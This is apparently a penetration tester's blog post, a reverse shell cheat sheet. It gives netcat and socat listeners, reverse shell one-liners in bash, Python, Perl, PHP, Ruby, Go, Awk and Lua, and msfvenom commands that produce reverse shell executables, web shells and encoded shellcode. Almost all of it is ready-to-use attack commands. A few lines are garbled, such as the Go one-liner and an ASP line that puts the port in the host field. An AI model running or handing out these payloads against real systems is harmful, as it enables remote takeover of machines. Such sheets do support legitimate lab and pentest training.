---
layout: post
author: hyprcub
title: Reverse Shell Cheat Sheet
tags: cheatsheet
---
# References

- [Get Reverse-shell via Windows one-liner](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
- [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
- Reverse shell cheat sheets:
	- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is a really awesome place to look for exotic shells
	- [HighOn.Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
	- [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

# General advices

- Don't forget to check for shells other than `sh` or `bash`: `ash`, `bsh`, `csh`, `ksh`, `zsh`, `pdksh`, `tcsh`. And so on, be creative.
- If your favorites `1234` or `1337` TCP ports don't work, try `80/tcp` or UDP ports as there may be filtering in place.
- In the following, replace `LHOST` with your IP and `LPORT` with your port.

# Listeners

| Command                                | Description          |
|----------------------------------------|----------------------|
| `nc -nlvp LPORT`                       | Netcat on TCP        |
| `nc -u -nlvp LPORT`                    | Netcat on UDP        |
| `socat -d -d TCP4-LISTEN:LPORT STDOUT` | Socat (yes 2 `-d`'s) |

# Short One-liners


| Command                                                        | Description                                      |                         |                                           |
|----------------------------------------------------------------|--------------------------------------------------|-------------------------|-------------------------------------------|
| `nc -nv LHOST LPORT -e /bin/sh`                                | [Traditional netcat](http://www.stearns.org/nc/) |                         |                                           |
| `ncat -nv LHOST LPORT -e /bin/sh`                              | [Nmap ncat](https://nmap.org/ncat//)             |                         |                                           |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f                            | /bin/sh -i 2>&1                                  | nc LHOST LPORT >/tmp/f` | OpenBSD netcat (doesn't have `-e` switch) |
| `socat TCP4:LHOST:LPORT EXEC:/bin/sh`                          | [Socat](http://www.dest-unreach.org/socat/)      |                         |                                           |
| `/bin/bash -i >& /dev/tcp/LHOST/LPORT 0>&1`                    | Bash TCP, works with `sh` too                    |                         |                                           |
| `/bin/bash -i >& /dev/udp/LHOST/LPORT 0>&1`                    | Bash UDP with listener `nc -u -lvp LPORT`        |                         |                                           |
| `0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196` | sh                                               |                         |                                           |

# Language Specific (Linux mostly)

Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Perl
```
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

PHP
```
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Ruby
```
ruby -rsocket -e'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

Golang
```
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","LHOST:LPORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go
```

Awk
```
awk 'BEGIN {s = "/inet/tcp/0/LHOST/LPORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

Lua
```
lua -e "require('socket');require('os');t=socket.tcp();t:connect('LHOST','LPORT');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

# Msfvenom generated 

Here the shell variables `lhost` and `lport` are set accordingly:
```bash
export lhost=$(ip address show tun0 | grep "inet " | awk '{print $2}' | cut -d "/" -f 1)
export lport=443
```

| Command                                                                                                                                            | Description                           |
|----------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------|
| `msfvenom -p cmd/unix/reverse_netcat LHOST=$lhost LPORT=$lport`                                                                                    | netcat                                |
| `msfvenom -p linux/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o myshell`                                                              | Linux 32bits bin                      |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o myshell`                                                              | Linux 64bits bin                      |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f war -o myshell.war`                                                           | Tomcat                                |
| `msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o myshell.exe`                                                            | Windows bin                           |
| `msfvenom -p windows/shell_reverse_tcp LHOST=$lport LPORT=$lport -f asp -o myshell.asp`                                                            | ASP                                   |
| `msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -f python -v shellcode -e x86/shikata_ga_nai -b "\x00\x0a\x0d"`   | Windows Shellcode for Buffer Overflow |
| `msfvenom -p linux/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -f python -v shellcode -e x86/shikata_ga_nai -b "\x00\x0a\x0d"` | Linux Shellcode for Buffer Overflow   |
